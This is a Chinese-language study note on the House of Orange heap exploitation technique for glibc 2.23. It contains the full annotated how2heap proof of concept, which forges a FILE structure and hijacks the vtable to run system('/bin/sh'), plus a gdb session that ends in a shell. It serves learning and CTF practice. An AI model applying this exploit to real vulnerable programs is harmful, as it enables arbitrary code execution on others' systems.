## House of Orange

#### 本机制目前只适用glibc-2.23，下面讲解基于how2heap中同名程序

### 机制讲解
* **在讲解之前，先看一下glibc-2.23版本下关于文件流和文件结构的有关结构体定义**
1. `_IO_File_plus`结构体，也就是`_IO_list_all`链表内单个元素(位于glibc-2.23/libio/libioP.h#342),下含两个成员`_IO_FILE`和`_IO_jump_t`
```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

2. IO FILE结构体源码（位于glibc-2.23/libio/libio.h#241）
```c
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

3. `_IO_jump_t`结构体源码（glibc-2.23/libio/libioP.h#307）
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

* **House of Orange,本质上先是通过unsortedbin攻击，将_IO_list_all全局文件结构链表指针指向一个我们可控的堆块（这里是old top chunk）**
**然后这个堆块被我们构造成可通过文件结构检查的伪文件结构_IO_FILE_plus**
**最后把他的jump table改掉，这里改的就是在标准输出的时候最后会执行的输出函数，最后执行的是_IO_overflow_t函数**
**通过前面构造把函数替换为我们的攻击函数地址，一般是system函数，这里是winner**
**然后故意分配一个错误的堆块，触发错误信息输出，引导程序执行错误的文件流函数，从而getshell**
**最开始的堆块我们之所以选择old top chunk，因为他足够大，可以够我们去构造FILE结构**
**我们通过Off by One漏洞把top chunk的size改了，导致分配0x1000的块的时候大小不够，他直接被放入unsortedbin了**

### Poc源码讲解
```c
// how2heap/glibc_2.23/house_of_orange.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*/
int winner ( char *ptr);

int main()
{
    /*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.
      
      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page

      If the size requested is smaller than 0x21000, then the former is followed.
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
  
    fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");

    p1 = malloc(0x400-16); // 任意malloc一个块

    top = (size_t *) ( (char *) p1 + 0x400 - 16); 利用地址偏移拿到top chunk的地址
    top[1] = 0xc01; // off by one（其实也不算，单纯可以索引到进行修改）改小top chunk大小

    p2 = malloc(0x1000); // 分配一个比top chunk当前size大的chunk，让top chunk进入unsortedbin
    

    io_list_all = top[2] + 0x9a8; // _IO_list_all位于unsortedbin的head的0x9a8位置，这是一个全局的链表头

    
 
    top[3] = io_list_all - 0x10; // 把top chunk的bk指针改为target_addr-0x10，这样unsortedbin attack之后就可以把链表头改为unsortedbin的头了，让系统误以为这个top chunk是FILE结构


    memcpy( ( char *) top, "/bin/sh\x00", 8); // 在top最开头放入/bin/sh字符串，这样后续调用函数的时候传入的指针指向的就是这里，就相当于system("/bin/sh\x00")

    

    top[1] = 0x61; // size改成smallbin的一个chunk size，便于之后进行的unlink操作


    FILE *fp = (FILE *) top; //准备构造FILE结构了

    /*
      1. Set mode to 0: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0 // 现将模式调为0，满足小于等于0检查


    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20 // 满足ptr>base的检查
    fp->_IO_write_ptr = (char *) 3; // top+0x28


    /*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the FILE struct:
      base_address+sizeof(FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */

    size_t *jump_table = &top[12]; // controlled memory // 找一块可控的地方，来放置假的jump table
    jump_table[3] = (size_t) &winner; // 这里正好对应jump table里面overwrite的位置，输出的时候会调用，把他改成了我们的攻击函数
    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8 // 这是_IO_FILE_plus结构体里面vtable对应偏移处，我们把他指向的东西改成了我们自己构造的跳转表


    /* Finally, trigger the whole chain by calling malloc */
    malloc(10); // malloc一个极小的块，触发unsortedbin上面的unlink，IO_list_all被篡改，伪造的结构进入链表，malloc调用输出的时候触发已经被篡改的“overwrite”函数，即winner函数，对应文件结构指针也被传入作为参数

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr); // 这里就变成system("/bin/sh\x00");了
    syscall(SYS_exit, 0);
    return 0;
}

```

### gdb调试展示
```bash
pwndbg> b 51
Breakpoint 2 at 0x555555555229: file glibc_2.23/house_of_orange.c, line 75.
pwndbg> c
Continuing.
The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).
Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x400 (with flag bits: 0x401)

Top chunk | PREV_INUSE
Addr: 0x555555559400
Size: 0x20c00 (with flag bits: 0x20c01)

pwndbg> b 78
Breakpoint 3 at 0x555555555246: file glibc_2.23/house_of_orange.c, line 122.
pwndbg> c
Continuing.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x400 (with flag bits: 0x401)

Top chunk | PREV_INUSE
Addr: 0x555555559400
Size: 0xc00 (with flag bits: 0xc01)

pwndbg> b 123
Breakpoint 4 at 0x555555555254: file glibc_2.23/house_of_orange.c, line 158.
pwndbg> c
Continuing.

pwndbg> p/x top
$1 = 0x555555559400
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x400 (with flag bits: 0x401)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555559400
Size: 0xbe0 (with flag bits: 0xbe1)
fd: 0x7ffff7bc4b78
bk: 0x7ffff7bc4b78

Allocated chunk
Addr: 0x555555559fe0
Size: 0x10 (with flag bits: 0x10)

Allocated chunk | PREV_INUSE
Addr: 0x555555559ff0
Size: 0x10 (with flag bits: 0x11)

Allocated chunk
Addr: 0x55555555a000
Size: 0x00 (with flag bits: 0x00)

pwndbg> n
pwndbg> p/x io_list_all
$2 = 0x7ffff7bc5520
pwndbg> x/gx $2
0x7ffff7bc5520 <_IO_list_all>:	0x00007ffff7bc5540

pwndbg> n
pwndbg> p/x top[3]
$3 = 0x7ffff7bc5510

pwndbg> n
pwndbg> x/s top
0x555555559400:	"/bin/sh"

pwndbg> b 242
Breakpoint 5 at 0x5555555552d4: file glibc_2.23/house_of_orange.c, line 251.
pwndbg> c
Continuing.

pwndbg> p/x &fp->_mode
$4 = 0x5555555594c0
pwndbg> p/x &fp->_IO_write_base
$5 = 0x555555559420
pwndbg> p/x &fp->_IO_write_ptr
$6 = 0x555555559428

pwndbg> b 254
Breakpoint 6 at 0x555555555306: file glibc_2.23/house_of_orange.c, line 257.
pwndbg> c
Continuing.

pwndbg> p/x jump_table-top
$7 = 0xc
pwndbg> p/x jump_table[3]
$8 = 0x555555555317
pwndbg> p/x &winner
$10 = 0x555555555317
pwndbg> p/x *(size_t *) ((size_t) fp + sizeof(FILE))
$11 = 0x555555559460
pwndbg> p/x jump_table
$12 = 0x555555559460

pwndbg> n
*** Error in `/home/lixingjian/pwn/how2heap/glibc_2.23/house_of_orange': malloc(): memory corruption: 0x00007ffff7bc5520 ***
[Attaching after process 36837 fork to child process 36863]
[New inferior 2 (process 36863)]
[Detaching after fork from parent process 36837]
[Inferior 1 (process 36837) detached]
process 36863 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 2: No source file named glibc_2.23/house_of_orange.c.
Error in re-setting breakpoint 3: No source file named glibc_2.23/house_of_orange.c.
Error in re-setting breakpoint 4: No source file named glibc_2.23/house_of_orange.c.
Error in re-setting breakpoint 5: No source file named glibc_2.23/house_of_orange.c.
Error in re-setting breakpoint 6: No source file named glibc_2.23/house_of_orange.c.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff7fb1740 (LWP 36863) vfork to child process 36864]
[New inferior 3 (process 36864)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 36863 after child exec]
[Inferior 2 (process 36863) detached]
process 36864 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$ ls
[Attaching after Thread 0x7ffff7fb1740 (LWP 36864) vfork to child process 36866]
[New inferior 4 (process 36866)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 36864 after child exec]
[Inferior 3 (process 36864) detached]
process 36866 is executing new program: /usr/bin/ls
warning: could not find '.gnu_debugaltlink' file for /usr/bin/ls
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
calc_tcache_idx    first_fit	glibc_2.27  glibc_2.34	glibc_2.38  glibc_2.42		LICENSE		     obsolete
calc_tcache_idx.c  first_fit.c	glibc_2.31  glibc_2.35	glibc_2.39  glibc-all-in-one	Makefile	     README.md
ci		   glibc_2.23	glibc_2.32  glibc_2.36	glibc_2.40  glibc_ChangeLog.md	malloc_playground
Dockerfile	   glibc_2.24	glibc_2.33  glibc_2.37	glibc_2.41  glibc_run.sh	malloc_playground.c
$ [Inferior 4 (process 36866) exited normally]
```

* **注意！由于从glibc-2.24开始IO FILE加入了新的检查机制，构造更加严苛了，所以house of orange从2.24开始不适用了**